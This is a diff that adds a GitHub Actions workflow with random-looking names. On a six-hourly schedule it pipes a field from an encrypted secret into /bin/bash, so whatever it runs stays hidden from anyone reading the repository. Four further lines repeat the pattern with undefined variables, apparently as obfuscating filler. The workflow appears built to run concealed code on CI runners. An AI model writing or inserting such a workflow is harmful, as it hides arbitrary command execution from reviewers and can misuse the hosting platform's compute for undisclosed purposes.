@@ -1,0 +1,22 @@
+name: southeastchance
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: southeastchance
+        env:
+          wtfx2172: ${{ secrets.wtfx2172 }}
+        run: |
+          echo $wtfx2172 | jq -r .tkcw52734 | /bin/bash
+          echo $xaf61395 | jq -r .uivog70127 | /bin/bash
+          echo $iutqs413 | jq -r .awfel128 | /bin/bash
+          echo $rxxv527 | jq -r .pi85 | /bin/bash
+          echo $jd7278 | jq -r .tk05 | /bin/bash
+
